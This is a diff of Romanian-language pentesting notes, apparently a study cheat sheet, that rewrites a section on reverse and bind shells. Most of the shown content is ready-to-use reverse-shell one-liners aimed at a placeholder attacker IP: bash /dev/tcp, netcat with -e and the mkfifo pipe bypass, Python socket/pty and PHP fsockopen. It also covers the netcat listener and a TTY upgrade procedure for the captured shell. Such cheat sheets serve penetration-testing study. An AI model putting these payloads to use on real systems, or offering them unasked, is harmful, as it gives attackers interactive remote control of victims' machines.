@@ -129,81 +129,104 @@ Platformă integrată pentru testarea securității aplicațiilor web. Funcțion
 
 ---
 
-### 4. Metode de Trimitere și Realizare a unui Reverse Shell
+# 4. Reverse Shell & Bind Shell
 
-Odată ce listener-ul este activat pe mașina de Kali, atacatorul trebuie să forțeze mașina țintă (prin intermediul unei vulnerabilități precum RCE, SQLi, Command Injection etc.) să execute un payload care inițiază conexiunea înapoi.
+Tehnică prin care o mașină țintă compromisă inițiază o conexiune de rețea ieșită (outbound) înapoi către mașina atacatorului, oferindu-i acestuia o linie de comandă interactivă (shell).
 
-Există multiple tipuri de payload-uri (Reverse Shell One-Liners) în funcție de tehnologiile disponibile pe serverul țintă:
+## 🔄 Reverse Shell vs. Bind Shell
 
-#### A. Reverse Shell prin Bash (Cel mai comun pe Linux)
-Dacă ținta rulează un sistem Linux, acesta este cel mai simplu și rapid mod de a trimite o conexiune înapoi:
+| Tip Shell | Cine ascultă (Listener) | Cine inițiază conexiunea | Avantaj / Caz de utilizare |
+| :--- | :--- | :--- | :--- |
+| **Reverse Shell** | Atacatorul (`nc -lvnp <port>`) | Ținta (prin payload/script) | Trece ușor de firewall-urile țintei (traficul outbound este de obicei permis). |
+| **Bind Shell** | Ținta deschide un port local | Atacatorul se conectează la IP-ul țintei | Util dacă atacatorul nu are IP rutabil direct sau dacă conexiunile outbound sunt blocate strict. |
+
+---
+
+## 🏗️ Componentele unui Reverse Shell
+
+Orice atac bazat pe Reverse Shell necesită parcurgerea obligatorie a doi pași: configurația receptorului pe mașina ta și execuția codului malițios pe serverul victimă.
+
+### Pasul 1: Configurarea Listener-ului (Pe mașina ta - Kali)
+Un utilitar de rețea (de regulă `netcat`) configurat să aștepte pasiv conexiunea de la țintă:
+
+```bash
+nc -lvnp 1234
+```
+*   `-l`: Ascultă (Listen) pentru conexiuni inbound.
+*   `-v`: Modul Verbose (afișează detalii despre conexiune).
+*   `-n`: Dezactivează rezoluția DNS (accelerează procesul).
+*   `-p 1234`: Specifică portul local pe care se deschide receptorul.
+
+---
+
+### Pasul 2: Metode de Trimitere și Payload-uri (Pe mașina țintă)
+Atacatorul trebuie să forțeze mașina țintă (prin exploatarea unei vulnerabilități de tip RCE, Command Injection, Web Upload etc.) să execute un script ("one-liner") care deschide un socket de rețea către IP-ul de Kali.
+
+#### 🐚 A. Bash One-Liners (Specific Linux)
+Dacă ținta rulează Linux, acesta este cel mai simplu mod nativ de redirecționare:
 ```bash
 bash -i >& /dev/tcp/<IP_ATACATOR>/<PORT> 0>&1
 ```
 *   `bash -i`: Porneste un shell Bash interactiv.
-*   `/dev/tcp/...`: Folosește funcționalitatea nativă a Linux de a deschide un socket de rețea direct către IP-ul și portul tău de Kali.
+*   `/dev/tcp/...`: Deschide un canal direct prin protocolul TCP către IP-ul și portul tău de atac.
 
----
+#### 🔌 B. Netcat (nc) One-Liners
+Dacă utilitarul este prezent pe server, sintaxa depinde de versiunea compilată:
 
-#### B. Reverse Shell prin Netcat (nc)
-Dacă utilitarul `netcat` este deja instalat pe mașina țintă, poate fi abuzat direct pentru a trimite un shell:
-
-* **Varianta clasică (dacă binarul suportă parametrul `-e`):**
+* **Versiunea clasică (suportă execuția directă):**
   ```bash
   nc <IP_ATACATOR> <PORT> -e /bin/bash
   ```
-  *   `-e /bin/bash`: Redirecționează terminalul Bash direct prin conexiunea de rețea.
-
-* **Varianta de securitate (dacă `-e` este blocat/incompatibil - NC Named Pipe):**
-  Multe sisteme moderne au versiuni de netcat care blochează opțiunea `-e` din motive de securitate. Acest lucru se ocolește creând o conductă (pipe) locală:
+* **Versiunea securizată (OpenBSD / Fără opțiunea `-e`):**
+  Multe sisteme Linux moderne blochează parametrul `-e`. Blocajul se ocolește prin crearea unei conducte (Named Pipe) în directorul temporar:
   ```bash
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATACATOR> <PORT> >/tmp/f
   ```
 
----
+#### 🐍 C. Python One-Liners
+Excelent pentru momentele în care ai execuție de cod într-o aplicație backend (ex: Django, Flask):
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACATOR>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+```
 
-#### C. Reverse Shell prin Python
-Foarte util dacă pe server rulează o aplicație web (cum ar fi Django, Flask) și ai acces la execuție de cod:
-
-* **Sintaxă Python 3:**
-  ```bash
-  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACATOR>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
-  ```
-
----
-
-#### D. Reverse Shell prin PHP
-Standardul de aur în atacurile asupra aplicațiilor web de tip CMS (WordPress, Joomla, etc.) unde poți încărca un fișier malițios:
-
-* **Comandă pe un singur rând (One-Liner):**
-  ```php
-  php -r '\$sock=fsockopen("<IP_ATACATOR>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
-  ```
-* **Fișier Web Shell (.php):**
-  Poți urca un script complet (precum celebrul *Pentestmonkey PHP Reverse Shell*) în panoul de administrare al site-ului, iar accesarea URL-ului acelui fișier va declanșa conexiunea către listener-ul tău.
+#### 🐘 D. PHP Web Shells / One-Liners
+Standardul folosit în exploatarea platformelor CMS (WordPress, Joomla) prin upload de fișiere malițioase sau injecție de cod:
+```php
+php -r '\$sock=fsockopen("<IP_ATACATOR>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
 
 ---
 
-### 🛠️ Stabilizarea Shell-ului (Shell Upgrade)
+## 🛠️ Stabilizarea Shell-ului (Shell Upgrade TTY)
 
-Atunci când primești un Reverse Shell prin `netcat`, terminalul obținut este extrem de instabil (nu funcționează tastele direcționale, `Tab` pentru auto-complete, iar `Ctrl+C` va închide conexiunea complet). Pentru a-l transforma într-un terminal TTY complet:
+Terminalul implicit obținut prin `netcat` este extrem de instabil (nu suportă `Tab` pentru auto-complete, tastele direcționale dau erori de tip `^[[A`, iar comanda `Ctrl+C` va închide conexiunea definitiv). Pentru a-l transforma într-un terminal stabil (TTY) se folosește următoarea procedură standard:
 
-1. **În interiorul reverse shell-ului primit, rulează Python pentru a spawna un shell curat:**
+### Procedura Pas cu Pas:
+
+1. **Spawnarea unui shell curat din interiorul conexiunii netcat:**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
-2. **Pune shell-ul în fundal (Background):**
-   Apasă combinația de taste `Ctrl + Z`.
-3. **În terminalul tău de Kali, configurează transmiterea caracterelor brute și adu shell-ul înapoi în prim-plan:**
+   *(Dacă serverul are doar Python 2, folosește `python` în loc de `python3`).*
+
+2. **Trimiterea procesului în fundal (Background):**
+   Apasă combinația de taste: `Ctrl + Z`
+
+3. **Configurarea terminalului local de Kali și readucerea shell-ului în prim-plan:**
+   Rulează în terminalul tău de Kali comanda combinată:
    ```bash
    stty raw -echo; fg
    ```
-   *(Apasă Enter după ce tastezi asta. Terminalul va părea că s-a blocat sau că e gol).*
-4. **Resetează configurația de terminal în shell-ul țintei:**
+   *(După ce apeși Enter, ecranul poate părea înghețat sau gol. Este normal, continuă cu pasul următor).*
+
+4. **Resetarea variabilelor de mediu ale terminalului:**
+   Tastați direct comanda de mai jos și apăsați Enter:
    ```bash
    export TERM=xterm
    ```
-   *După acest pas, scurtăturile din tastatură, culorile și auto-complete-ul vor funcționa normal.*
+
+După finalizarea acestor pași, scurtăturile din tastatură, istoricul comenzilor și culorile din terminal vor funcționa perfect, exact ca într-o sesiune SSH nativă.
+
 
 ---
 
